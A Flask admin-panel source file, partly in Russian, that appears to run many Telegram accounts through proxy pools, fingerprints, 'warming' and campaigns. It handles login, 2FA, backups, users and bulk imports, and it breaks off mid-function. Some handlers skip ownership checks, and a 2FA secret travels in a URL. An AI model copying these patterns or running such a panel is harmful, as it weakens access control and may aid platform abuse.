import datetime
from datetime import timezone
import io
import os
import zipfile
import json
import pyotp
import qrcode
import base64
import uuid
from pathlib import Path
from flask import Blueprint, render_template, redirect, url_for, request, flash, jsonify, send_file
from flask_login import login_user, logout_user, login_required, current_user
from sqlalchemy import select, func, or_, desc, and_
from web.extensions import db
from models.user import User
from models.account import Account
from models.proxy import Proxy
from models.admin_log import AdminLog
from models.campaign import Campaign
from models.stat import Stat
from models.account_log import AccountLog
from models.api_credential import ApiCredential
from models.notification import Notification
from models.tag import Tag, account_tags
from models.warming import WarmingScenario, WarmingSession
from models.user_session import UserSession
from models.task import Task
import csv
from web.middlewares.auth import admin_required
from core.logger import log
from core.config import Config

admin_bp = Blueprint('admin', __name__)


# --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ЛОГОВ ---
def log_action(action, details=""):
    """Записывает действие администратора в базу данных"""
    try:
        log_entry = AdminLog(
            username=current_user.username if current_user.is_authenticated else "anonymous",
            action=action,
            details=details,
            ip=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        db.session.add(log_entry)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        log.error(f"Logging error: {e}")


def create_notification(title, message, type='info', category='security', user_id=None, related_url=None):
    """Helper to create a notification from anywhere in the code"""
    try:
        notif = Notification(
            user_id=user_id, title=title, message=message,
            type=type, category=category, related_url=related_url
        )
        db.session.add(notif)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        log.error(f"create_notification error: {e}")


def log_change(action, entity_type, entity_id, changes_dict):
    """Records an audit trail entry with diff data"""
    try:
        log_entry = AdminLog(
            username=current_user.username if current_user.is_authenticated else "anonymous",
            action=action,
            details=f"{entity_type}:{entity_id}",
            ip=request.remote_addr,
            user_agent=request.headers.get('User-Agent'),
            changes=changes_dict
        )
        db.session.add(log_entry)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        log.error(f"log_change error: {e}")


def _get_api_settings():
    """Читает настройки Telegram API из JSON-файла"""
    settings_file = Path(Config.BASE_DIR) / 'api_settings.json'
    if settings_file.exists():
        try:
            with open(settings_file, 'r') as f:
                return json.load(f)
        except Exception:
            pass
    return {
        'api_id': str(Config.TG_API_ID or ''),
        'api_hash': Config.TG_API_HASH or '',
        'proxy_enabled': Config.PROXY_ENABLED,
        'proxy_type': Config.PROXY_TYPE or 'socks5',
        'proxy_host': Config.PROXY_HOST or '',
        'proxy_port': str(Config.PROXY_PORT or ''),
        'proxy_username': Config.PROXY_USERNAME or '',
        'proxy_password': Config.PROXY_PASSWORD or '',
    }


def _save_api_settings(settings: dict):
    """Сохраняет настройки Telegram API в JSON-файл"""
    settings_file = Path(Config.BASE_DIR) / 'api_settings.json'
    with open(settings_file, 'w') as f:
        json.dump(settings, f, indent=2)


def _get_rate_limits():
    """Читает настройки rate limiting из JSON-файла или конфигурации"""
    settings_file = Path(Config.BASE_DIR) / 'rate_limits.json'
    if settings_file.exists():
        try:
            with open(settings_file, 'r') as f:
                return json.load(f)
        except Exception:
            pass
    return {
        'code_send': Config.RATE_LIMIT_CODE_SEND,
        'code_verify': Config.RATE_LIMIT_CODE_VERIFY,
        'api': Config.RATE_LIMIT_API,
        'login': Config.RATE_LIMIT_LOGIN,
        'ip_whitelist': ', '.join(Config.IP_WHITELIST),
    }


def _save_rate_limits(settings: dict):
    """Сохраняет настройки rate limiting в JSON-файл"""
    settings_file = Path(Config.BASE_DIR) / 'rate_limits.json'
    with open(settings_file, 'w') as f:
        json.dump(settings, f, indent=2)


# ==========================================
# 1. АВТОРИЗАЦИЯ
# ==========================================
@admin_bp.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('admin.dashboard'))
        
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        otp = request.form.get('otp', '')
        
        try:
            user = db.session.execute(select(User).filter_by(username=username)).scalar_one_or_none()
            
            if user and user.check_password(password):
                now = datetime.datetime.now(timezone.utc)

                if user.locked_until and user.locked_until > now:
                    flash('Аккаунт временно заблокирован', 'danger')
                    return render_template('admin/login.html')

                if user.otp_secret and not user.verify_otp(otp):
                    flash('Неверный код 2FA', 'danger')
                    return render_template('admin/login.html')
                
                login_user(user)
                user.last_login = now
                user.login_attempts = 0
                db.session.commit()
                
                log_action("login", "Успешный вход")

                # Отправляем уведомление в Telegram о новом входе
                try:
                    from services.notification.telegram_bot import send_notification
                    send_notification(
                        f"✅ <b>Вход в панель управления</b>\n"
                        f"👤 Пользователь: <code>{user.username}</code>\n"
                        f"🌐 IP: <code>{request.remote_addr}</code>\n"
                        f"🕐 Время: {now.strftime('%Y-%m-%d %H:%M:%S UTC')}"
                    )
                except Exception as notify_err:
                    log.debug(f"Telegram notification skipped: {notify_err}")

                return redirect(url_for('admin.dashboard'))
            else:
                if user:
                    user.login_attempts += 1
                    if user.login_attempts >= 5:
                        user.locked_until = (
                            datetime.datetime.now(timezone.utc)
                            + datetime.timedelta(minutes=15)
                        )
                    db.session.commit()
                
                flash('Неверное имя пользователя или пароль', 'danger')
        except Exception as e:
            db.session.rollback()
            flash('Ошибка сервера при входе', 'danger')
            log.error(f"Login error: {e}")
            
    return render_template('admin/login.html')

@admin_bp.route('/logout')
@login_required
def logout():
    log_action("logout", "Выход из системы")
    logout_user()
    return redirect(url_for('admin.login'))

# ==========================================
# 2. ГЛАВНАЯ СТРАНИЦА (DASHBOARD)
# ==========================================
@admin_bp.route('/')
@login_required
def dashboard():
    """Главная страница админки со статистикой"""
    try:
        total_proxies = db.session.execute(select(func.count(Proxy.id))).scalar() or 0
        working_proxies = db.session.execute(select(func.count(Proxy.id)).filter(Proxy.status == 'working')).scalar() or 0

        stats = {
            'accounts': db.session.execute(select(func.count(Account.id))).scalar() or 0,
            'proxies': total_proxies,
            'working_proxies': working_proxies,
            'campaigns': db.session.execute(select(func.count(Campaign.id))).scalar() or 0,
            'active_tasks': 0
        }
        
        recent_logs = db.session.execute(
            select(AdminLog).order_by(desc(AdminLog.timestamp)).limit(5)
        ).scalars().all()
        
        today = datetime.date.today()
        today_stat = db.session.execute(select(Stat).filter_by(date=today)).scalar_one_or_none()
        
        return render_template('admin/dashboard.html', 
                             stats=stats, 
                             recent_logs=recent_logs, 
                             today_stat=today_stat)
    except Exception as e:
        log.error(f"Dashboard error: {e}")
        return "Ошибка при загрузке панели управления. Проверьте логи сервера.", 500

# ==========================================
# 3. УПРАВЛЕНИЕ РАЗДЕЛАМИ
# ==========================================
@admin_bp.route('/accounts')
@login_required
def accounts():
    page = request.args.get('page', 1, type=int)
    phone_filter = request.args.get('phone', '').strip()
    status_filter = request.args.get('status', '').strip()
    per_page = 25

    stmt = select(Account).order_by(desc(Account.created_at))
    # Non-superadmin users see only their own accounts (team isolation)
    if current_user.role != 'superadmin':
        stmt = stmt.filter(Account.owner_id == current_user.id)
    if phone_filter:
        stmt = stmt.filter(Account.phone.contains(phone_filter))
    if status_filter:
        stmt = stmt.filter(Account.status == status_filter)

    accounts_paginated = db.paginate(stmt, page=page, per_page=per_page)
    proxies = db.session.execute(select(Proxy).filter_by(enabled=True)).scalars().all()
    tags = db.session.execute(select(Tag)).scalars().all()

    # Build set of account IDs that have a fingerprint configured (for shield indicator)
    from models.account_fingerprint import AccountFingerprint
    fp_ids = {r[0] for r in db.session.execute(
        select(AccountFingerprint.account_id)
    ).all()}

    return render_template('admin/accounts.html',
                           accounts=accounts_paginated,
                           proxies=proxies,
                           tags=tags,
                           phone_filter=phone_filter,
                           status_filter=status_filter,
                           fingerprint_account_ids=fp_ids)

@admin_bp.route('/proxies')
@login_required
def proxies():
    page = max(1, int(request.args.get('page', 1)))
    per_page = 50
    total = db.session.execute(select(func.count(Proxy.id))).scalar() or 0
    proxies_list = db.session.execute(
        select(Proxy).order_by(desc(Proxy.id)).offset((page - 1) * per_page).limit(per_page)
    ).scalars().all()
    return render_template('admin/proxies.html', proxies=proxies_list, page=page, per_page=per_page, total=total)

@admin_bp.route('/campaigns')
@login_required
def campaigns():
    campaigns_list = db.session.execute(select(Campaign).order_by(desc(Campaign.created_at))).scalars().all()
    return render_template('admin/campaigns.html', campaigns=campaigns_list)

@admin_bp.route('/users')
@login_required
@admin_required
def users():
    from models.user import ALL_PERMISSIONS
    users_list = db.session.execute(select(User)).scalars().all()
    return render_template('admin/users.html', users=users_list, all_permissions=ALL_PERMISSIONS)

@admin_bp.route('/logs')
@login_required
def logs():
    page = request.args.get('page', 1, type=int)
    user_filter = request.args.get('user', '').strip()
    action_filter = request.args.get('action', '').strip()
    date_from = request.args.get('date_from', '').strip()
    date_to = request.args.get('date_to', '').strip()

    stmt = select(AdminLog).order_by(desc(AdminLog.timestamp))
    if user_filter:
        stmt = stmt.filter(AdminLog.username.contains(user_filter))
    if action_filter:
        stmt = stmt.filter(AdminLog.action == action_filter)
    if date_from:
        try:
            dt_from = datetime.datetime.strptime(date_from, '%Y-%m-%d')
            stmt = stmt.filter(AdminLog.timestamp >= dt_from)
        except ValueError:
            pass
    if date_to:
        try:
            dt_to = datetime.datetime.strptime(date_to, '%Y-%m-%d') + datetime.timedelta(days=1)
            stmt = stmt.filter(AdminLog.timestamp < dt_to)
        except ValueError:
            pass

    logs_paginated = db.paginate(stmt, page=page, per_page=100)
    actions = db.session.execute(select(AdminLog.action).distinct()).scalars().all()
    return render_template('admin/logs.html', logs=logs_paginated, actions=actions,
                           user_filter=user_filter, action_filter=action_filter,
                           date_from=date_from, date_to=date_to)

@admin_bp.route('/audit_logs')
@login_required
def audit_logs():
    """Журнал действий администратора"""
    page = request.args.get('page', 1, type=int)
    user_filter = request.args.get('user', '').strip()
    action_filter = request.args.get('action', '').strip()

    stmt = select(AdminLog).order_by(desc(AdminLog.timestamp))
    if user_filter:
        stmt = stmt.filter(AdminLog.username.contains(user_filter))
    if action_filter:
        stmt = stmt.filter(AdminLog.action == action_filter)

    logs_paginated = db.paginate(stmt, page=page, per_page=50)
    actions = db.session.execute(select(AdminLog.action).distinct()).scalars().all()
    return render_template('admin/audit_logs.html', logs=logs_paginated, actions=actions,
                           user_filter=user_filter, action_filter=action_filter)

# ==========================================
# 4. НАСТРОЙКИ
# ==========================================
@admin_bp.route('/settings', methods=['GET', 'POST'])
@login_required
def settings():
    """Страница настроек: смена пароля, 2FA, бэкапы"""
    from services.backup.archiver import list_backups

    if request.method == 'POST':
        action = request.form.get('action')

        if action == 'change_password':
            current_pw = request.form.get('current_password', '')
            new_pw = request.form.get('new_password', '')
            confirm_pw = request.form.get('confirm_password', '')

            if not current_user.check_password(current_pw):
                flash('Неверный текущий пароль', 'danger')
            elif len(new_pw) < 8:
                flash('Новый пароль должен содержать минимум 8 символов', 'danger')
            elif new_pw != confirm_pw:
                flash('Пароли не совпадают', 'danger')
            else:
                current_user.set_password(new_pw)
                db.session.commit()
                log_action("change_password", "Смена пароля")
                flash('Пароль успешно изменён', 'success')

        return redirect(url_for('admin.settings'))

    backups = list_backups()
    api_settings = _get_api_settings()
    rate_limits = _get_rate_limits()
    from models.panel_settings import PanelSettings
    brand_settings = {s.key: s.value for s in db.session.query(PanelSettings).filter(
        PanelSettings.key.in_(['brand_name', 'brand_logo_url', 'brand_accent_color', 'brand_bg_color'])
    ).all()}
    return render_template('admin/settings.html', backups=backups, api_settings=api_settings,
                           rate_limits=rate_limits, brand_settings=brand_settings)


@admin_bp.route('/settings/language', methods=['POST'])
@login_required
def set_language():
    """Сохранение языка интерфейса для текущего пользователя"""
    from flask import make_response
    lang = request.get_json(silent=True) or {}
    lang = lang.get('lang', request.form.get('lang', 'ru'))
    if lang not in ('ru', 'en'):
        lang = 'ru'
    current_user.language = lang
    db.session.commit()
    resp = make_response(jsonify({'success': True, 'lang': lang}))
    resp.set_cookie('lang', lang, max_age=365 * 24 * 3600, httponly=False, samesite='Lax')
    return resp


@admin_bp.route('/settings/2fa/enable', methods=['POST'])
@login_required
def enable_2fa():
    """Включение двухфакторной аутентификации"""
    otp_code = request.form.get('otp_code', '')
    temp_secret = request.form.get('temp_secret', '')

    if not temp_secret:
        flash('Ошибка: отсутствует временный секрет', 'danger')
        return redirect(url_for('admin.settings'))

    totp = pyotp.TOTP(temp_secret)
    if not totp.verify(otp_code):
        flash('Неверный код 2FA. Попробуйте снова.', 'danger')
        return redirect(url_for('admin.settings') + '?setup_2fa=1&secret=' + temp_secret)

    current_user.otp_secret = temp_secret
    db.session.commit()
    log_action("enable_2fa", "2FA включена")
    flash('Двухфакторная аутентификация успешно включена', 'success')
    return redirect(url_for('admin.settings'))


@admin_bp.route('/settings/2fa/disable', methods=['POST'])
@login_required
def disable_2fa():
    """Отключение двухфакторной аутентификации"""
    otp_code = request.form.get('otp_code', '')
    if not current_user.otp_secret:
        flash('2FA не была включена', 'warning')
        return redirect(url_for('admin.settings'))

    if not current_user.verify_otp(otp_code):
        flash('Неверный код 2FA', 'danger')
        return redirect(url_for('admin.settings'))

    current_user.otp_secret = None
    db.session.commit()
    log_action("disable_2fa", "2FA отключена")
    flash('Двухфакторная аутентификация отключена', 'success')
    return redirect(url_for('admin.settings'))


@admin_bp.route('/settings/2fa/setup')
@login_required
def setup_2fa():
    """Генерирует новый секрет 2FA и QR-код"""
    secret = pyotp.random_base32()
    totp = pyotp.TOTP(secret)
    uri = totp.provisioning_uri(name=current_user.username, issuer_name="ControlPanel")

    # Генерируем QR-код как base64
    try:
        img = qrcode.make(uri)
        buffered = io.BytesIO()
        img.save(buffered, format="PNG")
        qr_b64 = base64.b64encode(buffered.getvalue()).decode()
    except Exception:
        qr_b64 = None

    return jsonify({'secret': secret, 'uri': uri, 'qr': qr_b64})


@admin_bp.route('/settings/api', methods=['POST'])
@login_required
@admin_required
def save_api_settings():
    """Сохраняет настройки Telegram API"""
    settings = {
        'api_id': request.form.get('api_id', '').strip(),
        'api_hash': request.form.get('api_hash', '').strip(),
        'proxy_enabled': request.form.get('proxy_enabled') == 'on',
        'proxy_type': request.form.get('proxy_type', 'socks5'),
        'proxy_host': request.form.get('proxy_host', '').strip(),
        'proxy_port': request.form.get('proxy_port', '').strip(),
        'proxy_username': request.form.get('proxy_username', '').strip(),
        'proxy_password': request.form.get('proxy_password', '').strip(),
    }
    try:
        _save_api_settings(settings)
        log_action("save_api_settings", "Обновлены настройки Telegram API")
        flash('Настройки API сохранены', 'success')
    except Exception as e:
        flash(f'Ошибка при сохранении: {e}', 'danger')
    return redirect(url_for('admin.settings'))


@admin_bp.route('/settings/rate_limits', methods=['POST'])
@login_required
@admin_required
def save_rate_limits():
    """Сохраняет настройки rate limiting"""
    settings = {
        'code_send': request.form.get('rate_limit_code_send', '5 per minute').strip(),
        'code_verify': request.form.get('rate_limit_code_verify', '10 per minute').strip(),
        'api': request.form.get('rate_limit_api', '60 per minute').strip(),
        'login': request.form.get('rate_limit_login', '10 per minute').strip(),
        'ip_whitelist': request.form.get('ip_whitelist', '').strip(),
    }
    try:
        _save_rate_limits(settings)
        log_action("save_rate_limits", "Обновлены настройки rate limiting")
        flash('Настройки лимитов сохранены', 'success')
    except Exception as e:
        flash(f'Ошибка при сохранении: {e}', 'danger')
    return redirect(url_for('admin.settings'))


# ==========================================
# 5. БЭКАПЫ
# ==========================================
@admin_bp.route('/backups/create', methods=['POST'])
@login_required
def backup_create():
    """Создание нового бэкапа"""
    try:
        from services.backup.archiver import create_backup
        backup_path = create_backup()
        log_action("backup_create", f"Создан бэкап: {Path(backup_path).name}")
        flash(f'Бэкап успешно создан: {Path(backup_path).name}', 'success')
    except Exception as e:
        flash(f'Ошибка при создании бэкапа: {e}', 'danger')
        log.error(f"Backup create error: {e}")
    return redirect(url_for('admin.settings'))


def _safe_backup_path(filename):
    """Returns resolved backup path only if it stays within BACKUPS_DIR, else None."""
    backups_dir = Path(Config.BACKUPS_DIR).resolve()
    safe_name = Path(filename).name
    if not safe_name.startswith('backup_') or not safe_name.endswith('.zip'):
        return None, None
    candidate = (backups_dir / safe_name).resolve()
    if not candidate.is_relative_to(backups_dir):
        return None, None
    return candidate, safe_name


@admin_bp.route('/backups/<filename>/download')
@login_required
def backup_download(filename):
    """Скачивание бэкапа"""
    backup_path, safe_name = _safe_backup_path(filename)
    if backup_path is None or not backup_path.exists():
        flash('Файл не найден', 'danger')
        return redirect(url_for('admin.settings'))
    log_action("backup_download", f"Скачан бэкап: {safe_name}")
    return send_file(str(backup_path), as_attachment=True, download_name=safe_name)


@admin_bp.route('/backups/<filename>/restore', methods=['POST'])
@login_required
@admin_required
def backup_restore(filename):
    """Восстановление из бэкапа"""
    _, safe_name = _safe_backup_path(filename)
    if not safe_name:
        flash('Недопустимое имя файла', 'danger')
        return redirect(url_for('admin.settings'))
    try:
        from services.backup.archiver import restore_backup
        ok = restore_backup(safe_name)
        if ok:
            log_action("backup_restore", f"Восстановлено из: {safe_name}")
            flash(f'Восстановление из {safe_name} выполнено', 'success')
        else:
            flash('Файл бэкапа не найден', 'danger')
    except Exception as e:
        flash(f'Ошибка при восстановлении: {e}', 'danger')
    return redirect(url_for('admin.settings'))


@admin_bp.route('/backups/<filename>/delete', methods=['POST'])
@login_required
def backup_delete(filename):
    """Удаление бэкапа"""
    _, safe_name = _safe_backup_path(filename)
    if not safe_name:
        flash('Недопустимое имя файла', 'danger')
        return redirect(url_for('admin.settings'))
    try:
        from services.backup.archiver import delete_backup
        ok = delete_backup(safe_name)
        if ok:
            log_action("backup_delete", f"Удалён бэкап: {safe_name}")
            flash(f'Бэкап {safe_name} удалён', 'success')
        else:
            flash('Файл не найден', 'danger')
    except Exception as e:
        flash(f'Ошибка: {e}', 'danger')
    return redirect(url_for('admin.settings'))


# ==========================================
# 6. УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ
# ==========================================
@admin_bp.route('/users/add', methods=['POST'])
@login_required
@admin_required
def user_add():
    """Добавление нового администратора"""
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    role = request.form.get('role', 'admin')

    if not username or not password:
        flash('Имя пользователя и пароль обязательны', 'danger')
        return redirect(url_for('admin.users'))

    if len(password) < 8:
        flash('Пароль должен содержать минимум 8 символов', 'danger')
        return redirect(url_for('admin.users'))

    if role not in ('admin', 'superadmin', 'viewer'):
        role = 'admin'

    existing = db.session.execute(select(User).filter_by(username=username)).scalar_one_or_none()
    if existing:
        flash(f'Пользователь {username} уже существует', 'danger')
        return redirect(url_for('admin.users'))

    try:
        new_user = User(username=username, role=role)
        new_user.set_password(password)
        db.session.add(new_user)
        db.session.commit()
        log_action("user_add", f"Добавлен пользователь: {username} (роль: {role})")
        flash(f'Пользователь {username} успешно создан', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Ошибка: {e}', 'danger')

    return redirect(url_for('admin.users'))


@admin_bp.route('/users/<int:user_id>/toggle', methods=['POST'])
@login_required
@admin_required
def user_toggle(user_id):
    """Блокировка/разблокировка пользователя"""
    user = db.session.get(User, user_id)
    if not user:
        return jsonify({'success': False, 'error': 'Пользователь не найден'}), 404
    if user.id == current_user.id:
        return jsonify({'success': False, 'error': 'Нельзя заблокировать себя'}), 400

    user.is_active = not user.is_active
    db.session.commit()
    action = "user_unblock" if user.is_active else "user_block"
    log_action(action, f"Пользователь: {user.username}")
    return jsonify({'success': True, 'is_active': user.is_active})


@admin_bp.route('/users/<int:user_id>/delete', methods=['POST'])
@login_required
@admin_required
def user_delete(user_id):
    """Удаление пользователя"""
    user = db.session.get(User, user_id)
    if not user:
        return jsonify({'success': False, 'error': 'Пользователь не найден'}), 404
    if user.id == current_user.id:
        return jsonify({'success': False, 'error': 'Нельзя удалить собственный аккаунт'}), 400

    try:
        username = user.username
        db.session.delete(user)
        db.session.commit()
        log_action("user_delete", f"Удалён пользователь: {username}")
        return jsonify({'success': True})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/users/<int:user_id>/permissions', methods=['POST'])
@login_required
@admin_required
def user_update_permissions(user_id):
    """Обновление гранулярных прав пользователя"""
    from models.user import ALL_PERMISSIONS
    if current_user.role != 'superadmin':
        return jsonify({'success': False, 'error': 'Только superadmin может изменять права'}), 403
    user = db.session.get(User, user_id)
    if not user:
        return jsonify({'success': False, 'error': 'Пользователь не найден'}), 404
    data = request.get_json() or {}
    # Accept new role if provided
    new_role = data.get('role')
    if new_role and new_role in ('admin', 'superadmin', 'viewer'):
        user.role = new_role
    # Accept permissions dict
    perms = data.get('permissions')
    if isinstance(perms, dict):
        # Only store known permission keys
        user.permissions = {k: bool(v) for k, v in perms.items() if k in ALL_PERMISSIONS}
    db.session.commit()
    log_action('user_update_permissions', f'user={user.username} role={user.role}')
    return jsonify({'success': True})


# ==========================================
# 7. УПРАВЛЕНИЕ АККАУНТАМИ
# ==========================================
@admin_bp.route('/accounts/<account_id>/delete', methods=['POST'])
@login_required
def account_delete(account_id):
    """Удаление аккаунта"""
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Аккаунт не найден'}), 404
    try:
        phone = account.phone
        db.session.delete(account)
        db.session.commit()
        log_action("account_delete", f"Удалён аккаунт: {phone}")
        return jsonify({'success': True})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/accounts/bulk_delete', methods=['POST'])
@login_required
def accounts_bulk_delete():
    """Массовое удаление аккаунтов"""
    data = request.get_json()
    ids = data.get('ids', []) if data else []
    if not ids:
        return jsonify({'success': False, 'error': 'Не указаны ID'}), 400
    try:
        deleted = 0
        for aid in ids:
            account = db.session.get(Account, aid)
            if account:
                # Non-superadmin can only delete their own accounts
                if current_user.role != 'superadmin' and account.owner_id != current_user.id:
                    continue
                db.session.delete(account)
                deleted += 1
        db.session.commit()
        log_action("accounts_bulk_delete", f"Удалено аккаунтов: {deleted}")
        return jsonify({'success': True, 'deleted': deleted})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/accounts/<account_id>/update_notes', methods=['POST'])
@login_required
def account_update_notes(account_id):
    """Обновление заметок аккаунта (inline-редактирование)"""
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Аккаунт не найден'}), 404
    data = request.get_json()
    notes = data.get('notes', '') if data else ''

    account.notes = notes
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/accounts/upload', methods=['POST'])
@login_required
def accounts_upload():
    """Загрузка аккаунтов из текстового файла (drag-and-drop)"""
    if 'file' not in request.files:
        flash('Файл не выбран', 'danger')
        return redirect(url_for('admin.accounts'))
    f = request.files['file']
    content = f.read().decode('utf-8', errors='ignore')
    lines = [line.strip() for line in content.splitlines() if line.strip()]
    added = 0
    for phone in lines:
        if not phone.startswith('+'):
            phone = '+' + phone
        existing = db.session.execute(select(Account).filter_by(phone=phone)).scalar_one_or_none()
        if not existing:
            acc = Account(id=uuid.uuid4().hex, phone=phone)
            db.session.add(acc)
            added += 1
    db.session.commit()
    log_action("accounts_upload", f"Загружено из файла: {added} аккаунтов")
    flash(f'Добавлено {added} аккаунтов', 'success')
    return redirect(url_for('admin.accounts'))


# ==========================================
# 8. УПРАВЛЕНИЕ ПРОКСИ
# ==========================================
@admin_bp.route('/proxies/add', methods=['POST'])
@login_required
def proxy_add():
    """Добавление нового прокси"""
    proxy_str = request.form.get('proxy_string', '').strip()
    proxy_type = request.form.get('proxy_type', 'socks5')

    if not proxy_str:
        flash('Строка прокси обязательна', 'danger')
        return redirect(url_for('admin.proxies'))

    parsed = Proxy.parse_proxy_string(proxy_str)
    if not parsed:
        flash(f'Неверный формат прокси: {proxy_str}', 'danger')
        return redirect(url_for('admin.proxies'))

    try:
        existing = db.session.execute(
            select(Proxy).filter_by(host=parsed['host'], port=parsed['port'])
        ).scalar_one_or_none()
        if existing:
            flash(f'Прокси {parsed["host"]}:{parsed["port"]} уже существует', 'warning')
            return redirect(url_for('admin.proxies'))

        proxy = Proxy(
            type=parsed.get('type') or proxy_type,
            host=parsed['host'],
            port=parsed['port'],
            username=parsed.get('username'),
            password=parsed.get('password'),
        )
        db.session.add(proxy)
        db.session.commit()
        log_action("proxy_add", f"Добавлен прокси: {proxy.host}:{proxy.port}")
        flash(f'Прокси {proxy.host}:{proxy.port} добавлен', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Ошибка: {e}', 'danger')

    return redirect(url_for('admin.proxies'))


@admin_bp.route('/proxies/upload', methods=['POST'])
@login_required
def proxies_upload():
    """Загрузка прокси из текстового файла (drag-and-drop)"""
    if 'file' not in request.files:
        flash('Файл не выбран', 'danger')
        return redirect(url_for('admin.proxies'))
    f = request.files['file']
    content = f.read().decode('utf-8', errors='ignore')
    lines = [line.strip() for line in content.splitlines() if line.strip()]
    added = 0
    errors = 0
    for line in lines:
        parsed = Proxy.parse_proxy_string(line)
        if not parsed:
            errors += 1
            continue
        existing = db.session.execute(
            select(Proxy).filter_by(host=parsed['host'], port=parsed['port'])
        ).scalar_one_or_none()
        if existing:
            continue
        proxy = Proxy(
            type=parsed.get('type', 'socks5'),
            host=parsed['host'],
            port=parsed['port'],
            username=parsed.get('username'),
            password=parsed.get('password'),
        )
        db.session.add(proxy)
        added += 1
    db.session.commit()
    log_action("proxies_upload", f"Загружено из файла: {added} прокси, ошибок: {errors}")
    flash(f'Добавлено {added} прокси (ошибок парсинга: {errors})', 'success')
    return redirect(url_for('admin.proxies'))


@admin_bp.route('/proxies/<int:proxy_id>/delete', methods=['POST'])
@login_required
def proxy_delete(proxy_id):
    """Удаление прокси"""
    proxy = db.session.get(Proxy, proxy_id)
    if not proxy:
        return jsonify({'success': False, 'error': 'Прокси не найден'}), 404
    try:
        addr = f"{proxy.host}:{proxy.port}"
        db.session.delete(proxy)
        db.session.commit()
        log_action("proxy_delete", f"Удалён прокси: {addr}")
        return jsonify({'success': True})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/proxies/<int:proxy_id>/toggle', methods=['POST'])
@login_required
def proxy_toggle(proxy_id):
    """Включение/отключение прокси"""
    proxy = db.session.get(Proxy, proxy_id)
    if not proxy:
        return jsonify({'success': False, 'error': 'Прокси не найден'}), 404
    proxy.enabled = not proxy.enabled
    db.session.commit()
    log_action("proxy_toggle", f"{proxy.host}:{proxy.port} -> {'enabled' if proxy.enabled else 'disabled'}")
    return jsonify({'success': True, 'enabled': proxy.enabled})


@admin_bp.route('/proxies/<int:proxy_id>/update_description', methods=['POST'])
@login_required
def proxy_update_description(proxy_id):
    """Обновление описания прокси (inline-редактирование)"""
    proxy = db.session.get(Proxy, proxy_id)
    if not proxy:
        return jsonify({'success': False, 'error': 'Прокси не найден'}), 404
    data = request.get_json()
    proxy.description = data.get('description', '') if data else ''
    db.session.commit()
    return jsonify({'success': True})


@admin_bp.route('/proxies/bulk_delete', methods=['POST'])
@login_required
def proxies_bulk_delete():
    """Массовое удаление прокси по списку ID"""
    data = request.get_json() or {}
    raw_ids = data.get('ids', [])
    ids = []
    for i in raw_ids:
        try:
            ids.append(int(i))
        except (ValueError, TypeError):
            pass
    if not ids:
        return jsonify({'success': False, 'error': 'Список ID пуст'}), 400
    try:
        deleted = db.session.query(Proxy).filter(Proxy.id.in_(ids)).delete(synchronize_session=False)
        db.session.commit()
        log_action('proxies_bulk_delete', f'Удалено прокси: {deleted}')
        return jsonify({'success': True, 'deleted': deleted})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/proxies/delete_all', methods=['POST'])
@login_required
@admin_required
def proxies_delete_all():
    """Удаление всех прокси из базы данных"""
    try:
        count = db.session.query(Proxy).count()
        log_action('proxies_delete_all', f'Попытка удаления всех прокси: {count}')
        deleted = db.session.query(Proxy).delete(synchronize_session=False)
        db.session.commit()
        return jsonify({'success': True, 'deleted': deleted})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/proxies/bulk_import', methods=['POST'])
@login_required
def proxies_bulk_import():
    """Массовое добавление прокси из текста (textarea)"""
    data = request.get_json() or {}
    text = data.get('text', '')
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    added = 0
    errors = 0
    for line in lines:
        parsed = Proxy.parse_proxy_string(line)
        if not parsed:
            errors += 1
            continue
        existing = db.session.execute(
            select(Proxy).filter_by(host=parsed['host'], port=parsed['port'])
        ).scalar_one_or_none()
        if existing:
            continue
        proxy = Proxy(
            type=parsed.get('type', 'socks5'),
            host=parsed['host'],
            port=parsed['port'],
            username=parsed.get('username'),
            password=parsed.get('password'),
        )
        db.session.add(proxy)
        added += 1
    try:
        db.session.commit()
        log_action('proxies_bulk_import', f'Импортировано: {added}, ошибок: {errors}')
        return jsonify({'success': True, 'added': added, 'errors': errors})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# 9. ЭКСПОРТ ДАННЫХ
# ==========================================
@admin_bp.route('/export/accounts')
@login_required
def export_accounts():
    from services.export.excel import ExcelExporter
    stmt = select(Account)
    # Non-superadmin users export only their own accounts
    if current_user.role != 'superadmin':
        stmt = stmt.filter(Account.owner_id == current_user.id)
    accounts = db.session.execute(stmt).scalars().all()
    file_data = ExcelExporter.export_accounts(accounts)
    return send_file(
        file_data,
        mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        as_attachment=True,
        download_name=f'accounts_{datetime.date.today()}.xlsx'
    )


@admin_bp.route('/export/logs')
@login_required
def export_logs():
    """Экспорт логов в Excel с фильтрами"""
    from services.export.excel import ExcelExporter
    user_filter = request.args.get('user', '').strip()
    action_filter = request.args.get('action', '').strip()
    date_from = request.args.get('date_from', '').strip()
    date_to = request.args.get('date_to', '').strip()

